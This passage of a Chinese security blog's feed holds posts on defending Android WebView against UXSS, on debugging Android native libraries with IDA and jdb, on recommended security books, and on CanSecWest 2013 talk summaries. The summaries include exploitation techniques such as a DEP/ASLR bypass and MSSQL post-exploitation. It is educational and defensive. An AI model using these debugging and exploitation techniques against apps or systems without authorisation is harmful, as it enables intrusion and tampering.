&lt;center&gt;&lt;br&gt;&lt;img src=&quot;http://security.tencent.com/uploadimg_dir/201410/4e487d10cc5b5d8ec5cb4dac16c25ea6.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;图3：补丁代码对比&lt;br&gt;&lt;/center&gt;&lt;br&gt;补丁代码是调用securityOrigin::canAccess来检测是否同源，对应代码【如图4】。该函数主要执行以下操作：&lt;br&gt;&lt;br&gt;1. 先判断两个securityOrigin信息是否相同，是否具备唯一性，相同时则返回真，不相同时又会根据是否设置document.domain进行不同的检测；&lt;br&gt;2. 当两者均未设置document.domain时，则检测URL中的scheme、host、port是否相同，相同则返回真；&lt;br&gt;3. 当均设置document.domain时，则检测URL的domain与scheme是否相同，相同则返回真；&lt;br&gt;4. 若是打开本地文件，则执行其它文件安全检查。&lt;br&gt;&lt;br&gt;&lt;center&gt;&lt;br&gt;&lt;img src=&quot;http://security.tencent.com/uploadimg_dir/201410/27696966075c0f85cffae8efff453948.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图4：SecurityOrigin::canAccess函数代码&lt;br&gt;&lt;/center&gt; 

&lt;p&gt;其它很多UXSS漏洞也是对源检测不全导致的跨域问题，虽然在Chrome浏览器上修复了，但由于Android系统引用了同一套WebKit，导致曾被修复的漏洞再次重现。&lt;/p&gt;
&lt;p&gt;2013年底，国内安全人员就开始陆续将这类Android UXSS爆光在网上，也有不少人到乌云平台上刷分。之后，各种主流IT资讯站点、漏洞平台、自媒体上纷纷可以见到Android上各种弹框框的场面，尤为火爆。&lt;/p&gt;
&lt;p&gt;此前，腾讯安全中心终端安全团队也对Android UXSS漏洞进行过研究，发现此类UXSS漏洞危害还是比较大的，且影响到许多主流的Android应用，特别是涉及金融交易、个人通讯等敏感功能的应用，很容易导致资金被窃、帐号被盗或者隐私泄露。对此，TSRC的同学做了个演示demo，通过提供一个二维码或者url发送给他人，当使用聊天工具或者购物应用扫描二维码或者打开链接后，那么就可以窃取到他人的个人资料【如图5】。&lt;/p&gt;
&lt;p&gt;&lt;center&gt;&lt;br&gt;&lt;img src=&quot;http://security.tencent.com/uploadimg_dir/201410/c183110d4136651e024dd047b334ff1a.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图5：利用UXSS漏洞窃取用户资料&lt;br&gt;&lt;/center&gt;&lt;br&gt;同时，TSRC的同学也开发出一款UXSS自动化检测工具【如图6】，既支持批量测试，也支持PC、Android浏览器的检测，也发现当前国内一些Android下的浏览器也受UXSS漏洞影响，个别PC端的浏览器也受到影响。&lt;/p&gt;
&lt;p&gt;&lt;center&gt;&lt;br&gt;&lt;img src=&quot;http://security.tencent.com/uploadimg_dir/201410/de25ba2e9a6f51eabd2ec812c5af11f4.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图6：浏览器UXSS自动化检测工具&lt;br&gt;&lt;/center&gt;&lt;br&gt;Android UXSS主要是Android系统本身遗留的安全问题，但如果都各大应用厂商都依赖Google来修复的话，就显得过于被动了。而且即使Google修复了，多数用户也未必会及时升级。这样的话，许多用户依然可能会受到UXSS漏洞的影响。所以对于各应用厂商而言，动手去堆壁固垒筑造属于自己的城防是很有必要的。&lt;/p&gt;
&lt;h3 id=&quot;【下篇：堆壁固垒】&quot;&gt;&lt;a href=&quot;#【下篇：堆壁固垒】&quot; class=&quot;headerlink&quot; title=&quot;【下篇：堆壁固垒】&quot;&gt;&lt;/a&gt;【下篇：堆壁固垒】&lt;/h3&gt;&lt;p&gt;在Android的WebViewClient对象中，提供有一个叫OnPageStarted的事件方法【如图7】，它是WebView注入代码最早的事件，因此我们可以在攻击者利用UXSS注入JS代码前执行我们自己的检测代码，判断是否存在跨域操作。&lt;/p&gt;
&lt;p&gt;&lt;center&gt;&lt;br&gt;&lt;img src=&quot;http://security.tencent.com/uploadimg_dir/201410/7ef95f098c119e54f1aa72e22f7fcf7b.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图7：OnPageStared事件方法&lt;br&gt;&lt;/center&gt;&lt;br&gt;与此同时，还可通过对动态创建的危险元素进行 JS Hook，比如iframe、object等元素，然后再跟踪里面的的事件行为，看是否存在跨域，若存在就全部过滤掉，拒绝加载。&lt;/p&gt;
&lt;p&gt;目前腾讯安全中心终端安全团队已经完成该防御方案的开发，其测试效果【如图8】，可在不破坏程序稳定性的情况下，防御Android上的UXSS漏洞。&lt;/p&gt;
&lt;p&gt;&lt;center&gt;&lt;br&gt;&lt;img src=&quot;http://security.tencent.com/uploadimg_dir/201410/02ca43d6f6076216c57bb047e7842d91.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图8：Android UXSS防御工具Demo&lt;br&gt;&lt;/center&gt;&lt;br&gt;前面提到的这些UXSS漏洞，目前已经在最新版Android 4.4中修复，同时它也提供了自动升级webkit的功能，以便及时修复漏洞，因此建议广大用户尽量采用最新版的Android系统。&lt;/p&gt;
&lt;p&gt;对于厂商，除采用OnPageStarted + JS Hook的方法，还可以打包最新的Webkit内核供自家产品调用，但这会大大增加应用包的体积，而且需要跟随Google Webkit官方进行更新，相对麻烦一些，各厂商可根据自身情况选定。&lt;/p&gt;
&lt;h3 id=&quot;【后记：路漫漫其修远】&quot;&gt;&lt;a href=&quot;#【后记：路漫漫其修远】&quot; class=&quot;headerlink&quot; title=&quot;【后记：路漫漫其修远】&quot;&gt;&lt;/a&gt;【后记：路漫漫其修远】&lt;/h3&gt;&lt;p&gt;Android UXSS只是Android漏洞上的冰山一角，除此之外，还有addJavascriptInterface执行漏洞、FakeID漏洞等等，未来可能还会有其它漏洞被爆光，在面对这类安全问题时，如何更好地防御它，我们还有很多路要走。&lt;br&gt;有攻，必有防，如何在攻与防的对立统一中寻求突破，是一个安全人员永恒的话题。&lt;/p&gt;
&lt;h3 id=&quot;【附注：何为UXSS】&quot;&gt;&lt;a href=&quot;#【附注：何为UXSS】&quot; class=&quot;headerlink&quot; title=&quot;【附注：何为UXSS】&quot;&gt;&lt;/a&gt;【附注：何为UXSS】&lt;/h3&gt;&lt;p&gt;通用型跨站脚本（UXSS，Universal Cross-Site Scfipting），主要是利用浏览器及插件的漏洞（比如同源策略绕过，导致A站的脚本可以访问B站的各种私有属性，例如cookie等）来构造跨站条件，以执行恶意代码。它与普通的XSS的不同点就在于漏洞对象及受害范围的差异上，如表1所示。&lt;/p&gt;
&lt;p&gt;&lt;center&gt;&lt;br&gt;&lt;img src=&quot;http://security.tencent.com/uploadimg_dir/201410/35d2a816694f79c147fb1c75d564c635.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;表1：UXSS与普通XSS的对比&lt;br&gt;&lt;/center&gt;&lt;br&gt;正是由于UXSS可影响在浏览器访问的所有站点，因此才将其称为通用型跨站。 &lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;center&gt;&lt;br&gt;“前事之不忘，后事之师”—— 《战国策·赵策》&lt;br&gt;&lt;/center&gt;

&lt;h3 id=&quot;【开篇：前车之鉴】&quot;&gt;&lt;a href=&quot;#【开篇：前车之鉴】&quot; class=&quot;headerlink&quot; title=&quot;【开篇：前车之鉴】&quot;&gt;&lt;/a&gt;【开篇：前车之鉴】
    
    </summary>
    
      <category term="技术分享" scheme="http://riusksk.github.io/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="Android" scheme="http://riusksk.github.io/tags/Android/"/>
    
      <category term="UXSS" scheme="http://riusksk.github.io/tags/UXSS/"/>
    
  </entry>
  
  <entry>
    <title>动态调试 Android so库函数的方法</title>
    <link href="http://riusksk.github.io/2014/05/08/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-Android-so%E5%BA%93%E5%87%BD%E6%95%B0%E7%9A%84%E6%96%B9%E6%B3%95/"/>
    <id>http://riusksk.github.io/2014/05/08/动态调试-Android-so库函数的方法/</id>
    <published>2014-05-07T16:00:00.000Z</published>
    <updated>2016-08-07T06:09:36.000Z</updated>
    
    <content type="html">&lt;ol&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;am start -D -n 包名/类名&lt;/code&gt;，以等待调试的模式启动APK应用；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;以&lt;code&gt;su&lt;/code&gt;权限开启&lt;code&gt;android_server&lt;/code&gt;，然后&lt;code&gt;adb forward tcp:23946 tcp:23946&lt;/code&gt; 转发端口，并用IDA附加相应进程；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;通过DDMS获取相应进程的端口号，然后使用&lt;code&gt;jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700&lt;/code&gt;（DDMS查询到的端口号）；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;连接成功后，按&lt;code&gt;F9&lt;/code&gt;后手机上的“waiting for debugger”提示会自动消失；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;此时在so库的&lt;code&gt;JNI_Onload&lt;/code&gt;函数上下断点，可通过&lt;code&gt;Ctrl+S&lt;/code&gt;找到对应so库的基址，然后加上&lt;code&gt;JNI_Onload&lt;/code&gt;的文件偏移量，即可找到&lt;code&gt;JNI_Onload&lt;/code&gt;函数的内存地址，然后按F9运行后即可断下。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;下图是使用上述方法，断在某so库&lt;code&gt;JNI_Onload&lt;/code&gt;函数的截图：&lt;br&gt;&lt;img src=&quot;http://riusksk.me/media/android_debug.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;ol&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;am start -D -n 包名/类名&lt;/code&gt;，以等待调试的模式启动APK应用；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;以&lt;code&gt;su&lt;/code&gt;权限开启&lt;code&gt;android_server&lt;/code&gt;，然后&lt;code&gt;adb 
    
    </summary>
    
      <category term="技术分享" scheme="http://riusksk.github.io/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="Android" scheme="http://riusksk.github.io/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>购书心得</title>
    <link href="http://riusksk.github.io/2014/03/21/buybook/"/>
    <id>http://riusksk.github.io/2014/03/21/buybook/</id>
    <published>2014-03-20T16:00:00.000Z</published>
    <updated>2016-06-18T12:16:18.000Z</updated>
    
    <content type="html">&lt;p&gt;&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/buybook/643451796777498842.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;/center&gt;&lt;/p&gt;
&lt;p&gt;&lt;center&gt;&lt;br&gt;富家不用买良田，书中自有千钟粟；&lt;br&gt;安居不用架高堂，书中自有黄金屋；&lt;br&gt;出门莫恨无人随，书中车马多如簇；&lt;br&gt;娶妻莫恨无良媒，书中自有颜如玉；&lt;br&gt;男儿若遂平生志，六经勤向窗前读。&lt;br&gt;&lt;/center&gt;                      &lt;/p&gt;
&lt;p align=&quot;right&quot;&gt; —— 宋真宗赵恒《劝学诗》 &lt;/p&gt;


&lt;h3 id=&quot;移动安全篇&quot;&gt;&lt;a href=&quot;#移动安全篇&quot; class=&quot;headerlink&quot; title=&quot;移动安全篇&quot;&gt;&lt;/a&gt;移动安全篇&lt;/h3&gt;&lt;p&gt;国 内移动安全书籍很少，主要还是以国外的居多，虽然大部分未引进，但是很多可以在网上找到高清彩色英文原版，有些可能就是官方自己发出来的。虽然国外这方面 的书籍多，但看过几本Andorid安全书籍，感觉还是一般，深度不够，比如《Android Security：Attacks and Defenses》、《Android Apps Security》、《Mobile Application Security》、《Mobile Malware Attacks and Defense》,国内的《移动互联网之智能终端安全揭秘》也是不推荐，过多列点组装，缺乏个人主观理解，《Android安全机制解析与应用实践》更是 别买，学术派写的wiki式书籍。笔者推荐几本：《Android Security Cookbook》、《Android 软件安全与逆向分析》主要是讲Android应用安全，Android系统安全的书籍尚无专著出版，不过4月份《Android Hacker’s Handbook》就要出版了，看目录还是感觉蛮有料的，iOS安全书籍相对少一些，主要有《iOS Hacker’s Handbook》（主要讲系统安全，别买中文版，译者缺乏软件安全基础，错误太多，令人不忍直视）、《iOS应用安全攻防》（英文版，偏向应用安全）、 《iOS应用逆向工程:分析与实战》（今年刚出的iOS应用逆向方面的书籍），其它关于Android与iOS开发的书籍，网上电子版很多，自己挑着看 吧，移动安全方面的书籍，我大多是看电子书，买的纸质书基本都是不行。所以目前，移动安全书籍，还是尽量看国内英文原版吧，如果对Android安全感兴 趣的，看下《Android Hacker’s Handbook》一书（补充：目前网上已有电子版）。&lt;/p&gt;
&lt;h3 id=&quot;程序设计篇&quot;&gt;&lt;a href=&quot;#程序设计篇&quot; class=&quot;headerlink&quot; title=&quot;程序设计篇&quot;&gt;&lt;/a&gt;程序设计篇&lt;/h3&gt;&lt;p&gt;此处 程序语言主要以C、ASM为主，毕竟自己主要也只是学这两门语言，其它脚本语言，如PHP、ASP就不提了。关于C语言的书籍就有传说中的 “C语言四大名著”，即《C程序设计语言》、《C和指针》、《C陷阱与缺陷》、《C专家编程》，感觉在C编程上这几本书就够用了，至于数据结构和算法可参 考其它国外名著。国产的编程书籍没几本可出手的，关于C入门书籍，很多人会推荐谭浩强那书，最初我也是读这本书入门的，但后来慢慢地发觉那书不是很好，错 误不少，编程风格也不好。对于那些写着精通XXX、24小时XXX、30天XXX、XXX从入门到精通，这些书都是拿书名来忽悠人的，纯粹是作者用来骗稿 费的，对比一下那些国外名著的书名就知道了，一本好书一般是不会用那些土名字的。我很赞成SAI兄弟说的，半年之内不接触的技术，就不用去买这方面的书籍 了。关于ASM主要就《80x86汇编语言程序设计》、《windows环境下的32位汇编程序设 计》这两本，汇编语言的书籍相对会少一点，一些网上书店的程序设计一栏中甚至没有asm一类。很多编程书籍的内容写的都是千篇一律，比如C语言书籍， 不外乎都是些变量、数组、指针这些，但是某些书籍中就会有提到编程风格、内存优化、树、链表、折半搜索法，GDB调试，linux方面的知识，比如《c primer plus》《C和指针》，这些也算是书本的一个亮点。关于windows编程，首推《windows程序设计》上下册、《windows核心编程》，其它 的感觉也没必要看太多，还是以实践为主。编程书籍由于附有很多代码，在电脑上看电子版的感觉很伤眼，容易眼疲劳，因此有必要的话，可以买实体书来看，而且 在实际应用中，有时可以再拿出来参考参考，方便查阅。与此同时，也要奉劝大家“纸上得来终觉浅，绝知此事要躬行”，特别是对于编程学习者，一定要动手写代 码，光看书是没用，这也是我曾经犯过的错误！而且有些书是用来参考查阅，不是用来看的，不然即使你把那些牛书都看完 ，到最后也可能连几句代码也写不出来，最后受伤的永远是你自己！&lt;/p&gt;
&lt;h3 id=&quot;逆向工程篇&quot;&gt;&lt;a href=&quot;#逆向工程篇&quot; class=&quot;headerlink&quot; title=&quot;逆向工程篇&quot;&gt;&lt;/a&gt;逆向工程篇&lt;/h3&gt;&lt;p&gt;关于逆向工程这方面的书籍，自然是首 推看雪出版的《加密与解密》，在这方面，看雪的实力不会比国外的差，那里是逆向学习交流的好场所。在加解密第3版出版的时候就曾出现过山寨版的，因此大家 在购买时得看清楚了，最好到正规的书店购买，目前可能网上买不到了，不过网上有电子版。另外这方面的书籍还有《黑客反汇编揭密》《黑客调试技术揭密》 《逆向工程揭密》，国内出版的《软件调试》也是本牛书，弥补了国内这方面的空缺。还有出版的《IDA权威指南》也是本不错的书籍，详细讲解了IDA的 方方面面，看了之后，你会发现，会用IDA与不会用的差别有多大了。看雪翻译小组也曾出版过一本《IDA Pro代码破解揭秘》，不过这书我也没看过。在逆向工程这方面的书籍也差不多就这么几本了，其它像加解密入门实战，加密与解密实战超级手册，加解密全攻 略……这些基本上都可以摒弃，基本都是抄看雪加解密一书上的东西，大家无须花金钱、时间和精力在此上面。关于获取最新书讯的方法，大家可以订阅&lt;a href=&quot;http://china-pub.com&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;互动出版网&lt;/a&gt; 计算机新书的RSS，只要有计算机新书出来立马就知道了，它上面经常更新，不过很也是应用技术书籍，对于这些书籍，很多是 没必要买的，比如什么 windows 7使用大全，精通注册表，windows操作XXX，有必要的话，直接百度、google就行了，没必要花钱去买这类书籍。&lt;/p&gt;
&lt;h3 id=&quot;脚本安全篇&quot;&gt;&lt;a href=&quot;#脚本安全篇&quot; class=&quot;headerlink&quot; title=&quot;脚本安全篇&quot;&gt;&lt;/a&gt;脚本安全篇&lt;/h3&gt;&lt;p&gt;在 脚本攻防方面的书籍，最早的曾云好写的《精通黑客脚本》，这书写得相当全面，由浅入深，虽然不厚，但排版密集，内容还是很多的，只是纸质不太好，很 粗糙，里面有很多渗透实战案例，当年国内这方面的法律还不是很严格，若是放在今天，可能里面一些内容会被删除掉。另外大家也可看看老外的 《黑客攻防技术宝典：WEB实战篇》（重点推荐）《xss attack》《sql injection》（中译本：《SQL注入攻击与防御》），以及《WEB安全测试》，英文版的网上有电子书。近两年国内出版的，主要就《白帽子讲WEB 安全》、《WEB前端黑客技术》，推荐一阅。&lt;/p&gt;
&lt;h3 id=&quot;系统底层篇&quot;&gt;&lt;a href=&quot;#系统底层篇&quot; class=&quot;headerlink&quot; title=&quot;系统底层篇&quot;&gt;&lt;/a&gt;系统底层篇&lt;/h3&gt;&lt;p&gt;当年看的第一本系统原理书籍是《深入理解计算机系统》，很不错的一本书。其它此类书籍还有《深入解析windows操作系统》《widnows系统原理与 实现》等，国内之前还出了本 &lt;a href=&quot;http://www.amazon.cn/mn/detailmore?showtype=3700&amp;amp; prodid=zhbk934046&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;《windows操作系统原理》&lt;/a&gt;，上面还写着重点大学计算机教材，后面看了乱雪博客上一篇文章后才知道那书是抄袭的，还被原作者控告了，最后还赔偿 了，当年我还从头看完了。关于溢出攻击的书籍，国内主要有《网络渗透技术》、《0day安全：软件漏洞分析技术》《灰帽黑客》，虽然 网渗一书很早出版，其中有些已经过时，但是其思想是不会过时的。若想获取最新书籍，最好的方法还是上面说的：订阅RSS。对于一些不熟悉的技术书籍，一定 要先看完整目录，然后找找网上是否有电子版的，如果有就先看看再决定是否再买，另外如果你已经买或看过同类的经典书籍，就需要重新考虑是否真的有必要买 了。讲了那么多要花钱的书，下面讲讲免费的一套，那就《intel开发手册》，这一套是由因特尔公司免费向全球赠送的书籍，共五本，之前我还订了两套，全 都从美国寄到学校来了，原本以为第一封邮件没收到，就再发了一封，没想到Intel居然连送两套过来，真是大方的不行啊！现在他们已经不再寄送纸质书，仅 寄送包含电子版的光盘。’&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/buybook/643451796777498842.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;/center&gt;&lt;/p&gt;
&lt;p&gt;&lt;center&gt;&lt;br&gt;富家不用买良田，书中自有千钟粟；&lt;br&gt;安居不用架高堂，书中自有黄金屋；
    
    </summary>
    
      <category term="随笔杂谈" scheme="http://riusksk.github.io/categories/%E9%9A%8F%E7%AC%94%E6%9D%82%E8%B0%88/"/>
    
    
      <category term="书籍" scheme="http://riusksk.github.io/tags/%E4%B9%A6%E7%B1%8D/"/>
    
  </entry>
  
  <entry>
    <title>关于CanSecWest 2013大会</title>
    <link href="http://riusksk.github.io/2013/03/23/CanSecWest-2013/"/>
    <id>http://riusksk.github.io/2013/03/23/CanSecWest-2013/</id>
    <published>2013-03-22T16:00:00.000Z</published>
    <updated>2016-06-24T14:18:08.000Z</updated>
    
    <content type="html">&lt;p&gt;文档下载：&lt;a href=&quot;http://cansecwest.com/csw13archive.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://cansecwest.com/csw13archive.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;此次CanSecWest 2013大会的质量明显要高出BlackHat EU 2013很多，主要还是软件/系统安全为主，涉及漏洞利用和挖掘等技术。&lt;/p&gt;
&lt;h3 id=&quot;1、《Fuzzing-for-logic-and-state-issues》&quot;&gt;&lt;a href=&quot;#1、《Fuzzing-for-logic-and-state-issues》&quot; class=&quot;headerlink&quot; title=&quot;1、《Fuzzing for logic and state issues》&quot;&gt;&lt;/a&gt;1、《Fuzzing for logic and state issues》&lt;/h3&gt;&lt;p&gt;Peach Fuzzer框架的作者写的，主要是介绍peach3的新增特性，增加逻辑漏洞和无效的状态转换等问题，比如一些WEB认证的逻辑漏洞，PPT写得比较简洁，纯文字描述，不好完整理解，建议还是上官网看peach3的使用文档吧：&lt;a href=&quot;http://peachfuzzer.com/v3/PeachPit.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://peachfuzzer.com/v3/PeachPit.html&lt;/a&gt; ，上个月作者刚更新的，写得比较详细。&lt;/p&gt;
&lt;h3 id=&quot;2、《DEP-ASLR-bypass-without-ROP-JIT》&quot;&gt;&lt;a href=&quot;#2、《DEP-ASLR-bypass-without-ROP-JIT》&quot; class=&quot;headerlink&quot; title=&quot;2、《DEP ASLR bypass without ROP JIT》&quot;&gt;&lt;/a&gt;2、《DEP ASLR bypass without ROP JIT》&lt;/h3&gt;&lt;p&gt;绿盟的TK讲的，里面的思路最早是在2009年的中国软件安全峰会《Vulnerability: The next 10 years》中提到的，主要是利用 SharedUserData 地址 0x7ffe0000 在win上是固定不变的，再通过它找到SystemCall，然后设置其参数，来调用指定的系统函数。在安全峰会上，作者是调用NtUserLockWorkStation这一函数来设置锁屏，而在此次CSW大会上，作者是通过LdrHotPatchRoutine索引到LdrLoadDll来加载外部的DLL，实现任意代码执行，这种方法只工作在winx64上的32位程序，且在win8上微软已经修复此问题。&lt;/p&gt;
&lt;h3 id=&quot;3、《Adobe-Sandbox-WHEN-THE-BROKER-IS-BROKEN》&quot;&gt;&lt;a href=&quot;#3、《Adobe-Sandbox-WHEN-THE-BROKER-IS-BROKEN》&quot; class=&quot;headerlink&quot; title=&quot;3、《Adobe Sandbox WHEN THE BROKER IS BROKEN》&quot;&gt;&lt;/a&gt;3、《Adobe Sandbox WHEN THE BROKER IS BROKEN》&lt;/h3&gt;&lt;p&gt;exploit系列教程的作者peter写的议题，在以前的一些大会上，也有人做过关于adobe sandbox的分享，但总觉得PPT写得不过详细，这次peter的议题，我觉得写得挺详细的，由浅入深，从介绍沙盒的相关术语、client与broker之间的通讯原理开始讲起，并提起一些沙盒逃逸的攻击面，分析和提取cross call函数等信息，同时也提供一些demo，可惜只有ppt，要是能提供paper和code就更好了。&lt;/p&gt;
&lt;h3 id=&quot;4、《An-Android-Hacker’s-Journey-Challenges-in-Android-Security-Research》&quot;&gt;&lt;a href=&quot;#4、《An-Android-Hacker’s-Journey-Challenges-in-Android-Security-Research》&quot; class=&quot;headerlink&quot; title=&quot;4、《An Android Hacker’s Journey- Challenges in Android Security Research》&quot;&gt;&lt;/a&gt;4、《An Android Hacker’s Journey- Challenges in Android Security Research》&lt;/h3&gt;&lt;p&gt;对我而言，里面让我最感兴趣的是作者即将出版的《Android Hacker’s Handbook》这个系列的书都很经典，包括shellcode、web、macosx以及ios等书，都是相当经典的，上面4本除了ios那书只看了一小部分之外，其它3本我都详细阅读过，值得推荐，前两本国内早有中译本了。&lt;br&gt;这个议题里面讲了一些android软件漏洞，包括一些组件权限设置问题导致的信息泄露，以及linux内核漏洞，其中还有一张赛门铁克提供的移动设备威胁图表，列出了移动设备可能面临的各种安全威胁，做得挺不错的。最后讲述了一些android平台的调试技巧，包括远程调试、源码调试等，有兴趣的朋友可以看下。&lt;/p&gt;
&lt;h3 id=&quot;5、《Assessing-the-Linux-Desktop’s-Security》&quot;&gt;&lt;a href=&quot;#5、《Assessing-the-Linux-Desktop’s-Security》&quot; class=&quot;headerlink&quot; title=&quot;5、《Assessing the Linux Desktop’s Security》&quot;&gt;&lt;/a&gt;5、《Assessing the Linux Desktop’s Security》&lt;/h3&gt;&lt;p&gt;感觉一般，对这议题也不是很感兴趣。&lt;/p&gt;
&lt;h3 id=&quot;6、《MS-SQL-Post-Exploitation-Shenanigans-You’re-In-Now-What-》&quot;&gt;&lt;a href=&quot;#6、《MS-SQL-Post-Exploitation-Shenanigans-You’re-In-Now-What-》&quot; class=&quot;headerlink&quot; title=&quot;6、《MS SQL Post Exploitation Shenanigans: You’re In, Now What?》&quot;&gt;&lt;/a&gt;6、《MS SQL Post Exploitation Shenanigans: You’re In, Now What?》&lt;/h3&gt;&lt;p&gt;讲述 MS SQL Server 利用技术，主要是利用扩展存储过程API来利用MSSQL，包括获取密码hash，内存搜索hash替换，编写poc创建后门，以及利用msf来控制shell等方式。在实际的渗透测试中，相信大多数的企业还是会选择使用php + mysql，特别是近些年来，这一组合的比例一直在扩大，所以估计对此文感兴趣的人不会太多。&lt;/p&gt;
&lt;h3 id=&quot;7、《Cracking-and-Analyzing-Apple-iCloud-backups-Find-My-iPhone-Document-Storage》&quot;&gt;&lt;a href=&quot;#7、《Cracking-and-Analyzing-Apple-iCloud-backups-Find-My-iPhone-Document-Storage》&quot; class=&quot;headerlink&quot; title=&quot;7、《Cracking and Analyzing Apple iCloud backups, Find My iPhone, Document Storage》&quot;&gt;&lt;/a&gt;7、《Cracking and Analyzing Apple iCloud backups, Find My iPhone, Document Storage》&lt;/h3&gt;&lt;p&gt;基本就是在讲苹果的icloud服务及其原理，跟安全相关的内容不多，爱看不看。&lt;/p&gt;
&lt;h3 id=&quot;8、《UPnP-Vulnerabilities》&quot;&gt;&lt;a href=&quot;#8、《UPnP-Vulnerabilities》&quot; class=&quot;headerlink&quot; title=&quot;8、《UPnP Vulnerabilities》&quot;&gt;&lt;/a&gt;8、《UPnP Vulnerabilities》&lt;/h3&gt;&lt;p&gt;PPT写得很是简单，内容也不是感兴趣，爱看不看。&lt;/p&gt;
&lt;h3 id=&quot;9、《Analysis-of-a-Windows-Kernel-Vulnerability》&quot;&gt;&lt;a href=&quot;#9、《Analysis-of-a-Windows-Kernel-Vulnerability》&quot; class=&quot;headerlink&quot; title=&quot;9、《Analysis of a Windows Kernel Vulnerability》&quot;&gt;&lt;/a&gt;9、《Analysis of a Windows Kernel Vulnerability》&lt;/h3&gt;&lt;p&gt;共有273页，这是我见过最长的PPT文档。主要讲Duqu病毒所使用的 CVE-2011-3402：Windows win32k.sys TrueType 字体解析数组越界漏洞，从TTF字体格式开始分析，解释漏洞成因，以及漏洞的利用技术。在去年的syscan大会上，360的人也针对此漏洞分析过其原理及利用技术，可以交互参考阅读。国内最早分析并公开细节的应该是启明星辰，其在博客上也帖出了相应的分析文章，看雪和binvul论坛均有人发表相关的漏洞分析文章。&lt;/p&gt;
&lt;h3 id=&quot;10、《iOS-6-Exploitation-280-Days-Later》&quot;&gt;&lt;a href=&quot;#10、《iOS-6-Exploitation-280-Days-Later》&quot; class=&quot;headerlink&quot; title=&quot;10、《iOS 6 Exploitation 280 Days Later》&quot;&gt;&lt;/a&gt;10、《iOS 6 Exploitation 280 Days Later》&lt;/h3&gt;&lt;p&gt;作者之前搞了近10年的WEB安全，2010年中才开始搞iphone安全，但他98年就开始接触安全，也算是安全界的老一辈革命家了。讲了2012年之后出现过的一些ios漏洞，以及关于ios安全相关的资料和书籍，同时介绍苹果对此采取的一些保护机制（cookie、ASLR、程序目录权限限制……），大部分篇幅还是在介绍ios的保护机制。&lt;/p&gt;
&lt;h3 id=&quot;11、《Evil-Maid-Just-Got-Angrier：Why-Full-Disk-Encryption-With-TPM-is-Insecure-on-Many-Systems》&quot;&gt;&lt;a href=&quot;#11、《Evil-Maid-Just-Got-Angrier：Why-Full-Disk-Encryption-With-TPM-is-Insecure-on-Many-Systems》&quot; class=&quot;headerlink&quot; title=&quot;11、《Evil Maid Just Got Angrier：Why Full-Disk Encryption With TPM is Insecure on Many Systems》&quot;&gt;&lt;/a&gt;11、《Evil Maid Just Got Angrier：Why Full-Disk Encryption With TPM is Insecure on Many Systems》&lt;/h3&gt;&lt;p&gt;讲述关于bios那些底层的东东，看不懂，真心看不懂！&lt;/p&gt;
&lt;h3 id=&quot;12、《Physical-Privilege-Escalation-and-Mitigation-in-the-x86-World》&quot;&gt;&lt;a href=&quot;#12、《Physical-Privilege-Escalation-and-Mitigation-in-the-x86-World》&quot; class=&quot;headerlink&quot; title=&quot;12、《Physical Privilege Escalation and Mitigation in the x86 World》&quot;&gt;&lt;/a&gt;12、《Physical Privilege Escalation and Mitigation in the x86 World》&lt;/h3&gt;&lt;p&gt;硬件hacking一类的议题，PPT也大多是贴图，不好理解，反正是没看懂这PPT&lt;/p&gt;
&lt;h3 id=&quot;13、《Smart-TV-Security》&quot;&gt;&lt;a href=&quot;#13、《Smart-TV-Security》&quot; class=&quot;headerlink&quot; title=&quot;13、《Smart TV Security》&quot;&gt;&lt;/a&gt;13、《Smart TV Security》&lt;/h3&gt;&lt;p&gt;一个有趣的议题，主要讲关于智能电视安全，包括智能电视机上面的app漏洞，以及恶意app感染、网络通讯安全等问题，同时还介绍智能电视固件rootkit的开发，如何留取后门。控制智能电视后最大的风险就是用它来监控和窃听你的行为，因为智能电视都配有摄像头。最后，还介绍一些调试等逆向相关技术，以及操作电视的一些API函数。&lt;/p&gt;
&lt;h3 id=&quot;14、《The-Evolution-of-BlackHole》&quot;&gt;&lt;a href=&quot;#14、《The-Evolution-of-BlackHole》&quot; class=&quot;headerlink&quot; title=&quot;14、《The Evolution of BlackHole》&quot;&gt;&lt;/a&gt;14、《The Evolution of BlackHole》&lt;/h3&gt;&lt;p&gt;总觉得这是BlackHol exploit kit的广告帖，介绍BlackHole这一漏洞利用工具包的一些功能，一套售价冒似是1500美元，不过里面的一些功能看起来还是不错的。 &lt;/p&gt;
</content>
    
    <summary type="html">
    
